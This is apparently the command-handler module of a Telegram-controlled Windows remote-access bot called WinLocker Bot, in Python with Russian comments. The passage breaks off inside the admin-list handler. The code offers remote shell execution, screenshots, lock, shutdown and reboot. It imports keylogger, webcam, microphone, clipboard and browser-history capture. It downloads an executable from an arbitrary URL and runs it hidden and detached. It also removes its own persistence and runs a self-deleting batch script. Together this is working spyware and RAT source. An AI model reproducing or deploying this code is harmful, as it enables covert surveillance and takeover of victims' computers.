# bot_commands.py
"""
Обработчики команд Telegram-бота
"""

import os
import sys
import time
import subprocess
import requests
from telebot import types
from datetime import datetime

# Импорт модулей проекта
from bot_core import (
    get_bot, command_handler, escape_html, is_admin, check_permission,
    get_admin_role, get_target_device_hwid, set_admin_session,
    get_admin_session, CURRENT_HWID, CURRENT_DEVICE_NAME,
    ROLE_SUPER_ADMIN, ROLE_ADMIN, logger, db,
    set_user_state, get_user_state, clear_user_state, is_waiting_confirmation,
    start_confirmation_flow, process_confirmation, get_confirmation_full_message
)
from bot_services import (
    take_screenshot, get_process_list, kill_process, lock_computer,
    shutdown_computer, restart_computer, execute_command, get_system_info,
    download_update, apply_update, get_keylog, start_keylogger, stop_keylogger,
    list_files, delete_file, capture_webcam, record_microphone, get_clipboard_content,
    get_browser_history, get_installed_apps, perform_full_scan, perform_deep_scan,
    show_message_box, change_directory, download_file, validate_path,
    get_active_window
)
from config import SUPER_ADMIN_ID

# Ленивая инициализация бота
_bot_instance = None

def get_bot_instance():
    """Получение экземпляра бота с ленивой инициализацией"""
    global _bot_instance
    if _bot_instance is None:
        _bot_instance = get_bot()
    return _bot_instance

bot = get_bot_instance()

# Глобальная переменная для хранения процесса watchdog
watchdog_process = None

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def send_success_message(chat_id, text="успешно ✅"):
    """Отправка сообщения об успехе с автоматическим удалением через 10 секунд"""
    try:
        msg = bot.send_message(chat_id, text)
        # Запланировать удаление через 10 секунд с использованием asyncio
        import asyncio
        async def delete_later():
            await asyncio.sleep(10)
            try:
                bot.delete_message(chat_id, msg.message_id)
            except Exception as e:
                logger.debug(f"Не удалось удалить сообщение: {e}")
        
        # Создаем асинхронную задачу
        import threading
        def run_async():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(delete_later())
            loop.close()
        
        thread = threading.Thread(target=run_async, daemon=True)
        thread.start()
        return msg
    except Exception as e:
        logger.error(f"Ошибка отправки сообщения об успехе: {e}")
        return None

def perform_uninstall():
    """Выполнение полного удаления бота с устройства"""
    import os
    import sys
    import time
    import subprocess
    import shutil
    from bot_core import remove_from_startup, logger
    
    try:
        logger.info("Начинается процедура полного удаления бота...")
        
        # 1. Остановка watchdog процесса, если он запущен
        try:
            import psutil
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if 'watchdog' in proc.info['name'].lower():
                        proc.terminate()
                        logger.info(f"Остановлен процесс watchdog: {proc.info['pid']}")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except ImportError:
            pass
        
        # 2. Удаление из автозагрузки (реестр)
        try:
            remove_from_startup()
            logger.info("Удалено из автозагрузки реестра")
        except Exception as e:
            logger.error(f"Ошибка удаления из автозагрузки: {e}")
        
        # 3. Удаление запланированных задач
        try:
            subprocess.run(['schtasks', '/delete', '/tn', 'WinLockerBot', '/f'],
                          capture_output=True, shell=True, timeout=5)
            logger.info("Удалена запланированная задача WinLockerBot")
        except Exception as e:
            logger.debug(f"Ошибка удаления запланированной задачи: {e}")
        
        # 4. Удаление из папки автозагрузки
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            for file in os.listdir(startup_folder):
                if 'winlocker' in file.lower() or 'bot' in file.lower():
                    os.remove(os.path.join(startup_folder, file))
                    logger.info(f"Удален файл из автозагрузки: {file}")
        except Exception as e:
            logger.debug(f"Ошибка очистки папки автозагрузки: {e}")
        
        # 5. Очистка базы данных (удаление записи текущего устройства)
        try:
            from bot_core import db, CURRENT_HWID
            db.delete_device(CURRENT_HWID)
            logger.info(f"Удалено устройство из БД: {CURRENT_HWID}")
        except Exception as e:
            logger.error(f"Ошибка удаления устройства из БД: {e}")
        
        # 6. Создание скрипта самоудаления
        try:
            # Создаем batch-скрипт для удаления файлов
            script_content = """@echo off
chcp 65001 >nul
echo Удаление WinLocker Bot...
timeout /t 3 /nobreak >nul

REM Удаляем основные файлы
del /f /q "%~dp0*.exe" 2>nul
del /f /q "%~dp0*.py" 2>nul
del /f /q "%~dp0*.bat" 2>nul
del /f /q "%~dp0*.spec" 2>nul
del /f /q "%~dp0*.log" 2>nul

REM Удаляем папки
rmdir /s /q "%~dp0build" 2>nul
rmdir /s /q "%~dp0dist" 2>nul
rmdir /s /q "%~dp0__pycache__" 2>nul

REM Удаляем сам скрипт
del /f /q "%~f0" 2>nul

echo Удаление завершено.
pause
"""
            
            script_path = os.path.join(os.path.dirname(sys.executable), 'self_delete.bat')
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(script_content)
            
            # Запускаем скрипт самоудаления
            subprocess.Popen(['cmd', '/c', script_path],
                           creationflags=subprocess.CREATE_NO_WINDOW)
            logger.info(f"Запущен скрипт самоудаления: {script_path}")
            
        except Exception as e:
            logger.error(f"Ошибка создания скрипта самоудаления: {e}")
        
        # 7. Завершение работы бота
        logger.info("Процедура удаления завершена. Бот будет остановлен.")
        time.sleep(2)
        
        # Завершаем процесс
        os._exit(0)
        
    except Exception as e:
        logger.error(f"Критическая ошибка при удалении: {e}")
        raise

# --- ОСНОВНЫЕ КОМАНДЫ ---

@bot.message_handler(commands=['start'])
def start_command(message):
    """Команда /start - приветствие и регистрация устройства"""
    user_id = message.from_user.id
    
    from bot_core import register_device
    register_device()
    
    # Проверяем, является ли пользователь администратором
    is_user_admin = db.get_admin(user_id) is not None
    user_role = get_admin_role(user_id) or "user"
    
    welcome_text = f"""
🎮 <b>Удаленный администратор v16.0</b>

✅ Устройство: <b>{CURRENT_DEVICE_NAME}</b>
🆔 HWID: <code>{CURRENT_HWID}</code>

📋 <b>Основные команды:</b>
/panel - Панель управления
/pc_list - Список устройств
/info - Информация об устройстве
/screen - Скриншот экрана
/procs - Список процессов
/keylog - Лог клавиатуры
/cmd - Выполнить команду CMD
/lock - Блокировка компьютера
/poweroff - Выключение компьютера
/restart - Перезагрузка компьютера

⚙️ <b>Система:</b>
/update_url - OTA обновление
/wd_download - Загрузить watchdog.exe
/wd_on - Запустить watchdog
/wd_off - Остановить watchdog

👨‍💼 <b>Администрирование:</b>
/admin_list - Список администраторов
/add_admin - Добавить администратора (SuperAdmin)
/del_admin - Удалить администратора (SuperAdmin)

Ваша роль: <b>{user_role}</b>
{"⚠️ <i>Вы не являетесь администратором. Обратитесь к SuperAdmin для получения доступа.</i>" if not is_user_admin else ""}
"""
    
    bot.reply_to(message, welcome_text, parse_mode='HTML')
    db.log_action(user_id, "start_command")

@bot.message_handler(commands=['panel'])
@command_handler
def panel_command(message):
    """Команда /panel - выбор устройства (первый этап двухэтапного интерфейса)"""
    user_id = message.from_user.id
    
    # Получаем список устройств
    devices = db.get_all_devices()
    
    if not devices:
        bot.reply_to(message, "📭 Нет доступных устройств. Используйте команду /start на целевом устройстве для регистрации.", parse_mode='HTML')
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # Кнопки выбора устройств
    device_buttons = []
    for device in devices:
        device_name = escape_html(device.get('device_name', 'Unknown'))
        device_hwid = device.get('hwid')
        last_online = device.get('last_online', 'Never')
        
        # Форматируем время последней активности
        if last_online:
            try:
                last_dt = datetime.fromisoformat(last_online.replace('Z', '+00:00'))
                time_ago = datetime.now() - last_dt
                if time_ago.total_seconds() < 60:
                    last_str = "только что"
                elif time_ago.total_seconds() < 3600:
                    last_str = f"{int(time_ago.total_seconds() / 60)} мин назад"
                else:
                    last_str = f"{int(time_ago.total_seconds() / 3600)} ч назад"
            except:
                last_str = "давно"
        else:
            last_str = "никогда"
        
        button_text = f"{device_name} ({last_str})"
        callback_data = f"select_device_{device_hwid}"
        device_buttons.append(types.InlineKeyboardButton(button_text, callback_data=callback_data))
    
    # Добавляем кнопки устройствами (по 2 в ряд)
    for i in range(0, len(device_buttons), 2):
        if i + 1 < len(device_buttons):
            markup.row(device_buttons[i], device_buttons[i + 1])
        else:
            markup.row(device_buttons[i])
    
    # Кнопка обновления списка
    markup.row(types.InlineKeyboardButton("🔄 Обновить список", callback_data="refresh_devices"))
    
    # Текущее выбранное устройство
    session = get_admin_session(user_id)
    current_device_name = "Не выбрано"
    if session and session.get('device_hwid'):
        current_device = db.get_device(session.get('device_hwid'))
        if current_device:
            current_device_name = current_device.get('device_name', 'Неизвестно')
    
    text = f"""
🎛 <b>Панель управления - Выбор устройства</b>

📱 <b>Доступные устройства:</b> {len(devices)}
🎯 <b>Текущее выбранное устройство:</b> {current_device_name}

Выберите устройство для управления:
"""
    
    bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')
    db.log_action(user_id, "panel_command")

@bot.message_handler(commands=['pc_list'])
@command_handler
def pc_list_command(message):
    """Команда /pc_list - список всех устройств"""
    user_id = message.from_user.id
    devices = db.get_all_devices()
    
    if not devices:
        bot.reply_to(message, "📭 Нет зарегистрированных устройств.")
        return
    
    text = "📋 <b>Список устройств:</b>\n\n"
    
    for i, device in enumerate(devices, 1):
        device_name = escape_html(device.get('device_name', 'Unknown'))
        device_hwid = device.get('hwid')
        last_online = device.get('last_online', 'Never')
        watchdog_status = device.get('watchdog_status', 'unknown')
        ip_address = device.get('ip_address', 'N/A')
        
        # Форматируем время
        if last_online and last_online != 'Never':
            try:
                last_dt = datetime.fromisoformat(last_online.replace('Z', '+00:00'))
                time_ago = datetime.now() - last_dt
                if time_ago.total_seconds() < 60:
                    last_str = "только что"
                elif time_ago.total_seconds() < 300:
                    last_str = "онлайн"
                elif time_ago.total_seconds() < 3600:
                    last_str = f"{int(time_ago.total_seconds() / 60)} мин назад"
                else:
                    last_str = f"{int(time_ago.total_seconds() / 3600)} ч назад"
            except:
                last_str = last_online
        else:
            last_str = "никогда"
        
        # Определяем реальный статус Watchdog
        # Для текущего устройства проверяем наличие файла watchdog.exe
        # Для удаленных устройств доверяем базе данных
        if device_hwid == CURRENT_HWID:
            import os
            import sys
            
            def check_watchdog_file_exists():
                """Проверка наличия файла watchdog.exe"""
                if getattr(sys, 'frozen', False):
                    base_dir = os.path.dirname(sys.executable)
                else:
                    base_dir = os.path.dirname(os.path.abspath(__file__))
                
                watchdog_exe_path = os.path.join(base_dir, 'watchdog.exe')
                return os.path.exists(watchdog_exe_path)
            
            watchdog_file_exists = check_watchdog_file_exists()
            if not watchdog_file_exists:
                real_status = "not installed"
                status_icon = "⚫"
            elif watchdog_status == 'active':
                real_status = "active"
                status_icon = "🟢"
            elif watchdog_status == 'stopped':
                real_status = "stopped"
                status_icon = "🔴"
            else:
                real_status = watchdog_status
                status_icon = "🟡"
        else:
            # Для удаленных устройств используем статус из базы данных
            real_status = watchdog_status
            if watchdog_status == 'active':
                status_icon = "🟢"
            elif watchdog_status == 'stopped':
                status_icon = "🔴"
            else:
                status_icon = "🟡"
        
        text += f"{i}. <b>{device_name}</b>\n"
        text += f"   🆔 HWID: <code>{device_hwid[:8]}...</code>\n"
        text += f"   📍 IP: {ip_address}\n"
        text += f"   ⏰ Последняя активность: {last_str}\n"
        text += f"   🐕 Watchdog: {status_icon} {real_status}\n\n"
    
    bot.reply_to(message, text, parse_mode='HTML')
    db.log_action(user_id, "pc_list_command")

@bot.message_handler(commands=['info'])
@command_handler
def info_command(message):
    """Команда /info - информация о текущем устройстве"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    device = db.get_device(target_hwid)
    if not device:
        bot.reply_to(message, "❌ Устройство не найдено в базе данных.")
        return
    
    device_name = device.get('device_name', 'Unknown')
    last_online = device.get('last_online', 'Never')
    watchdog_status = device.get('watchdog_status', 'unknown')
    
    # Проверяем реальное наличие watchdog.exe для текущего устройства
    import os
    import sys
    
    def check_watchdog_file_exists():
        """Проверка наличия файла watchdog.exe"""
        if getattr(sys, 'frozen', False):
            base_dir = os.path.dirname(sys.executable)
        else:
            base_dir = os.path.dirname(os.path.abspath(__file__))
        
        watchdog_exe_path = os.path.join(base_dir, 'watchdog.exe')
        return os.path.exists(watchdog_exe_path)
    
    # Определяем реальный статус
    if target_hwid == CURRENT_HWID:
        watchdog_file_exists = check_watchdog_file_exists()
        if not watchdog_file_exists:
            real_status = "not installed"
        else:
            real_status = watchdog_status
    else:
        # Для удаленных устройств доверяем базе данных
        real_status = watchdog_status
    
    # Получаем системную информацию для текущего устройства
    system_info_text = ""
    if target_hwid == CURRENT_HWID:
        system_info = get_system_info()
        if system_info:
            system_info_text = f"""
💻 <b>Системная информация:</b>
🖥 CPU: {system_info.get('cpu_percent', 'N/A')}% ({system_info.get('cpu_count', 'N/A')} ядер)
🧠 ОЗУ: {system_info.get('memory_percent', 'N/A')}% ({system_info.get('memory_used_gb', 0):.1f}/{system_info.get('memory_total_gb', 0):.1f} GB)
💾 Диск: {system_info.get('disk_percent', 'N/A')}% ({system_info.get('disk_used_gb', 0):.1f}/{system_info.get('disk_total_gb', 0):.1f} GB)
⏱ Аптайм: {system_info.get('uptime_hours', 0)}ч {system_info.get('uptime_minutes', 0)}мин
"""
        else:
            system_info_text = "\n⚠️ Не удалось получить системную информацию"
    else:
        system_info_text = "\n⚠️ Системная информация доступна только для текущего устройства"
    
    ip_address = device.get('ip_address', 'N/A')
    
    text = f"""
📊 <b>Информация об устройстве</b>

<b>Имя:</b> {device_name}
<b>HWID:</b> <code>{target_hwid}</code>
<b>IP:</b> {ip_address}
<b>Последняя активность:</b> {last_online}
<b>Статус Watchdog:</b> {real_status}
{system_info_text}
"""
    
    bot.reply_to(message, text, parse_mode='HTML')
    db.log_action(user_id, "info_command")

@bot.message_handler(commands=['screen'])
@command_handler
def screen_command(message):
    """Команда /screen - скриншот экрана"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    try:
        bot.reply_to(message, "📸 Делаю скриншот...")
        screenshot_path = take_screenshot()
        
        # Получаем информацию об устройстве для подписи
        device = db.get_device(target_hwid)
        device_name = device.get('device_name', 'Неизвестное устройство') if device else 'Неизвестное устройство'
        
        # Создаем подпись с именем устройства
        caption = f"📸 Скриншот экрана\n📱 Устройство: {device_name}\n🆔 HWID: {target_hwid[:8]}..."
        
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption=caption)
        
        # Удаляем временный файл
        import os
        os.remove(screenshot_path)
        
        db.log_action(user_id, "screen_command")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка создания скриншота: {e}")

@bot.message_handler(commands=['active'])
@command_handler
def active_command(message):
    """Команда /active - показать активное окно/приложение"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    try:
        active_window = get_active_window()
        
        # Получаем информацию об устройстве
        device = db.get_device(target_hwid)
        device_name = device.get('device_name', 'Неизвестное устройство') if device else 'Неизвестное устройство'
        
        text = f"""
🖥 <b>Активное окно/приложение</b>

📱 Устройство: <b>{device_name}</b>
🆔 HWID: <code>{target_hwid[:8]}...</code>

📋 <b>Активное окно:</b>
{active_window}

⏰ Время запроса: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        bot.reply_to(message, text, parse_mode='HTML')
        db.log_action(user_id, "active_command")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка получения активного окна: {e}")

@bot.message_handler(commands=['procs'])
@command_handler
def procs_command(message):
    """Команда /procs - список процессов (отправляется как файл для обхода таймаутов)"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    try:
        bot.reply_to(message, "🖥 Получаю список процессов...")
        processes = get_process_list(limit=100)  # Увеличиваем лимит для полного списка
        
        # Форматирование в текстовый файл
        header = "=" * 60 + "\n"
        header += "СПИСОК ПРОЦЕССОВ\n"
        header += f"Устройство: {target_hwid}\n"
        header += f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        header += "=" * 60 + "\n\n"
        
        text_content = header
        
        # Добавляем системную информацию
        try:
            from bot_services import get_system_info
            system_info = get_system_info()
            if system_info:
                text_content += f"Системная информация:\n"
                text_content += f"  CPU: {system_info.get('cpu_percent', 'N/A')}%\n"
                text_content += f"  ОЗУ: {system_info.get('memory_percent', 'N/A')}% ({system_info.get('memory_used_gb', 0):.1f}/{system_info.get('memory_total_gb', 0):.1f} GB)\n"
                text_content += f"  Диск: {system_info.get('disk_percent', 'N/A')}%\n"
                text_content += f"  Аптайм: {system_info.get('uptime_hours', 0)}ч {system_info.get('uptime_minutes', 0)}мин\n\n"
        except:
            pass
        
        text_content += f"Всего процессов: {len(processes)}\n\n"
        
        # Форматируем процессы в виде таблицы
        text_content += "№  Имя процесса                         PID     CPU%   RAM%\n"
        text_content += "-" * 60 + "\n"
        
        for i, proc in enumerate(processes, 1):
            name = proc.get('name', 'Unknown')
            pid = proc.get('pid', 'N/A')
            cpu = proc.get('cpu_percent', 0)
            memory = proc.get('memory_percent', 0)
            
            # Форматируем в виде таблицы
            text_content += f"{i:2d}. {name[:35]:35} {pid:8} {cpu:6.1f}% {memory:6.1f}%\n"
        
        # Добавляем итоговую информацию
        text_content += "\n" + "=" * 60 + "\n"
        text_content += f"Всего процессов: {len(processes)}\n"
        text_content += f"Сгенерировано: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        
        # ОБХОД ТАЙМАУТОВ TELEGRAM: отправляем как файл
        import io
        from datetime import datetime
        
        # Создаем файл в памяти
        file_data = io.BytesIO(text_content.encode('utf-8'))
        
        # КРИТИЧЕСКИ ВАЖНО: Telegram API требует наличия имени файла
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"procs_{timestamp}.txt"
        file_data.name = filename
        
        # Получаем информацию об устройстве для подписи
        device = db.get_device(target_hwid)
        device_name = device.get('device_name', 'Неизвестное устройство') if device else 'Неизвестное устройство'
        
        caption = f"🖥 Список процессов\n📱 Устройство: {device_name}\n🆔 HWID: {target_hwid[:8]}...\n📊 Всего процессов: {len(processes)}"
        
        # Отправляем файл через send_document
        bot.send_document(
            message.chat.id,
            file_data,
            caption=caption,
            visible_file_name=filename
        )
        
        send_success_message(message.chat.id, "успешно ✅")
        db.log_action(user_id, "procs_command")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка получения списка процессов: {e}")
        logger.error(f"Ошибка в procs_command: {e}")

@bot.message_handler(commands=['kill'])
@command_handler
def kill_command(message):
    """Команда /kill - завершение процесса"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Использование: /kill <имя_процесса>")
        return
    
    process_name = args[1]
    
    # Подтверждение через inline-кнопки
    markup = types.InlineKeyboardMarkup()
    markup.row(
        types.InlineKeyboardButton("✅ Да, завершить", callback_data=f"kill_confirm_{process_name}"),
        types.InlineKeyboardButton("❌ Отмена", callback_data="kill_cancel")
    )
    
    bot.reply_to(message, 
                f"⚠️ Вы уверены, что хотите завершить все процессы с именем <b>{process_name}</b>?",
                reply_markup=markup,
                parse_mode='HTML')

@bot.message_handler(commands=['lock'])
@command_handler
def lock_command(message):
    """Команда /lock - блокировка компьютера (требует подтверждения)"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    # Запускаем процесс подтверждения
    start_confirmation_flow(user_id, 'lock')
    
    # Отправляем сообщение с инструкцией
    confirmation_msg = get_confirmation_full_message('lock')
    bot.reply_to(message, confirmation_msg, parse_mode='HTML')

@bot.message_handler(commands=['poweroff'])
@command_handler
def poweroff_command(message):
    """Команда /poweroff - выключение компьютера (требует подтверждения)"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    # Запускаем процесс подтверждения
    start_confirmation_flow(user_id, 'poweroff')
    
    # Отправляем сообщение с инструкцией
    confirmation_msg = get_confirmation_full_message('poweroff')
    bot.reply_to(message, confirmation_msg, parse_mode='HTML')

@bot.message_handler(commands=['reboot'])
@command_handler
def reboot_command(message):
    """Команда /reboot - перезагрузка компьютера (требует подтверждения)"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    # Запускаем процесс подтверждения
    start_confirmation_flow(user_id, 'reboot')
    
    # Отправляем сообщение с инструкцией
    confirmation_msg = get_confirmation_full_message('reboot')
    bot.reply_to(message, confirmation_msg, parse_mode='HTML')

@bot.message_handler(commands=['cmd'])
@command_handler
def cmd_command(message):
    """Команда /cmd - выполнение команды CMD"""
    user_id = message.from_user.id
    target_hwid = get_target_device_hwid(user_id)
    
    if target_hwid != CURRENT_HWID:
        bot.reply_to(message, "⚠️ Команда доступна только для текущего устройства.")
        return
    
    args = message.text.split()
    if len(args) < 2:
        # Если команда не указана, переходим в интерактивный режим
        from bot_core import set_user_state
        set_user_state(user_id, 'waiting_cmd_input', 'cmd', {'target_hwid': target_hwid})
        bot.reply_to(message, "💻 Вы перешли в режим терминала. Введите системную команду для выполнения в CMD:\n\nДля отмены введите /cancel")
        return
    
    command = ' '.join(args[1:])
    
    try:
        bot.reply_to(message, f"⚙️ Выполняю команду: `{command}`", parse_mode='Markdown')
        result = execute_command(command)
        
        if len(result) > 4000:
            result = result[:4000] + "\n... (сообщение обрезано)"
        
        bot.reply_to(message, f"📋 Результат:\n```\n{result}\n```", parse_mode='Markdown')
        db.log_action(user_id, f"cmd_command: {command[:50]}")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка выполнения команды: {e}")

@bot.message_handler(commands=['wd_download'])
@command_handler
def wd_download_command(message):
    """Команда /wd_download - загрузка watchdog.exe"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав.")
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Использование: /wd_download <url>")
        bot.reply_to(message, "Пример: /wd_download https://www.dropbox.com/s/...?dl=0")
        return
    
    url = args[1]
    
    # Обработка Dropbox ссылок
    if 'dropbox.com' in url and 'dl=0' in url:
        url = url.replace('dl=0', 'dl=1')
        bot.reply_to(message, f"🔗 Обновлена Dropbox ссылка для прямого скачивания")
    
    try:
        bot.reply_to(message, f"📥 Начинаю загрузку watchdog.exe...\nURL: {url[:100]}...")
        
        # Загрузка файла
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()
        
        # Сохранение файла с правильным путем
        import sys
        if getattr(sys, 'frozen', False):
            base_dir = os.path.dirname(sys.executable)
        else:
            base_dir = os.path.dirname(os.path.abspath(__file__))
        
        watchdog_path = os.path.join(base_dir, 'watchdog.exe')
        
        total_size = int(response.headers.get('content-length', 0))
        downloaded = 0
        
        with open(watchdog_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
                    
                    # Отправка прогресса каждые 10%
                    if total_size > 0:
                        progress = (downloaded / total_size) * 100
                        if progress % 10 < 1:  # Примерно каждые 10%
                            bot.send_chat_action(message.chat.id, 'upload_document')
        
        # Проверка размера файла
        file_size = os.path.getsize(watchdog_path)
        
        if file_size > 0:
            bot.reply_to(message, f"✅ watchdog.exe успешно загружен!\n"
                                f"📁 Размер: {file_size / 1024 / 1024:.2f} MB\n"
                                f"📍 Путь: {watchdog_path}")
            db.log_action(user_id, f"wd_download_command: {url[:50]}")
        else:
            bot.reply_to(message, "❌ Загруженный файл пуст или поврежден")
            os.remove(watchdog_path)
            
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"❌ Ошибка загрузки: {e}")
    except Exception as e:
        bot.reply_to(message, f"❌ Неожиданная ошибка: {e}")

@bot.message_handler(commands=['wd_on'])
@command_handler
def wd_on_command(message):
    """Команда /wd_on - запуск watchdog.exe"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав.")
        return
    
    global watchdog_process
    
    # Проверка наличия файла с правильным путем
    import sys
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))
    
    watchdog_path = os.path.join(base_dir, 'watchdog.exe')
    
    if not os.path.exists(watchdog_path):
        bot.reply_to(message, "❌ Файл watchdog.exe не найден.\n"
                            "Используйте команду: /wd_download <url>")
        return
    
    # Проверка, не запущен ли уже процесс
    try:
        import psutil
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and 'watchdog.exe' in proc.info['name'].lower():
                bot.reply_to(message, "⚠️ watchdog.exe уже запущен")
                return
    except:
        pass  # Если psutil не доступен, продолжаем
    
    try:
        # Запуск процесса с отсоединением, чтобы watchdog оставался работать после остановки mainbot
        watchdog_process = subprocess.Popen(
            [watchdog_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        
        bot.reply_to(message, f"✅ watchdog.exe запущен (PID: {watchdog_process.pid})")
        db.update_watchdog_status(CURRENT_HWID, 'active')
        db.log_action(user_id, "wd_on_command")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка запуска watchdog.exe: {e}")

@bot.message_handler(commands=['wd_off'])
@command_handler
def wd_off_command(message):
    """Команда /wd_off - остановка watchdog.exe"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав.")
        return
    
    global watchdog_process
    
    try:
        # Попытка остановить через taskkill без окна
        import subprocess
        subprocess.run('taskkill /F /IM watchdog.exe 2>nul', shell=True,
                      creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Также останавливаем наш процесс, если он был запущен через нас
        if watchdog_process:
            try:
                watchdog_process.terminate()
                watchdog_process.wait(timeout=5)
            except:
                pass
            watchdog_process = None
        
        bot.reply_to(message, "✅ watchdog.exe остановлен")
        db.update_watchdog_status(CURRENT_HWID, 'stopped')
        db.log_action(user_id, "wd_off_command")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка остановки watchdog.exe: {e}")

@bot.message_handler(commands=['add_admin'])
@command_handler
def add_admin_command(message):
    """Добавление нового администратора (только для SuperAdmin) с интерактивным вводом"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_SUPER_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав. Только SuperAdmin может добавлять администраторов.")
        return
    
    args = message.text.split()
    
    # Если передан ID в команде
    if len(args) >= 2:
        try:
            new_admin_id = int(args[1])
            role = args[2] if len(args) > 2 else ROLE_ADMIN
            
            # Убираем роль guest из допустимых
            if role not in [ROLE_SUPER_ADMIN, ROLE_ADMIN]:
                bot.reply_to(message, "❌ Неверная роль. Допустимые роли: super_admin, admin")
                return
            
            # Проверяем, не пытаемся ли добавить второго SuperAdmin
            if role == ROLE_SUPER_ADMIN:
                all_admins = db.get_all_admins()
                super_admin_count = sum(1 for admin in all_admins if admin.get('role') == ROLE_SUPER_ADMIN)
                if super_admin_count >= 1 and new_admin_id != SUPER_ADMIN_ID:
                    bot.reply_to(message, "❌ Можно иметь только одного SuperAdmin (кроме изначального).")
                    return
            
            # Добавляем администратора
            username = f"user_{new_admin_id}"  # Будет обновлено при первом использовании
            if db.add_admin(new_admin_id, username, role):
                bot.reply_to(message, f"✅ Администратор добавлен:\nID: {new_admin_id}\nРоль: {role}")
                db.log_action(user_id, "add_admin", f"Added admin {new_admin_id} with role {role}")
            else:
                bot.reply_to(message, "❌ Ошибка добавления администратора.")
        except ValueError:
            bot.reply_to(message, "❌ Неверный формат ID. ID должен быть числом.")
        except Exception as e:
            bot.reply_to(message, f"❌ Ошибка: {e}")
    else:
        # Запрашиваем ID интерактивно
        bot.reply_to(message, "📝 Введите ID пользователя для добавления в администраторы:\n(или отправьте /cancel для отмены)")
        set_user_state(user_id, 'waiting_add_admin_id', 'add_admin')

@bot.message_handler(commands=['del_admin'])
@command_handler
def del_admin_command(message):
    """Удаление администратора"""
    user_id = message.from_user.id
    
    if not check_permission(user_id, ROLE_SUPER_ADMIN):
        bot.reply_to(message, "❌ Недостаточно прав. Только SuperAdmin может удалять администраторов.")
        return
    
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "⚠️ Использование: /del_admin <telegram_id>")
            return
        
        admin_id_to_delete = int(args[1])
        
        # Нельзя удалить самого себя или изначального SuperAdmin
        if admin_id_to_delete == user_id:
            bot.reply_to(message, "❌ Нельзя удалить самого себя.")
            return
        
        if admin_id_to_delete == SUPER_ADMIN_ID:
            bot.reply_to(message, "❌ Нельзя удалить изначального SuperAdmin.")
            return
        
        if db.remove_admin(admin_id_to_delete):
            bot.reply_to(message, f"✅ Администратор {admin_id_to_delete} удален.")
            db.log_action(user_id, "del_admin", f"Deleted admin {admin_id_to_delete}")
        else:
            bot.reply_to(message, "❌ Ошибка удаления администратора.")
    except ValueError:
        bot.reply_to(message, "❌ Неверный формат ID. ID должен быть числом.")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(commands=['admin_list'])
@command_handler
def admin_list_command(message):
    """Команда /admin_list - список администраторов"""
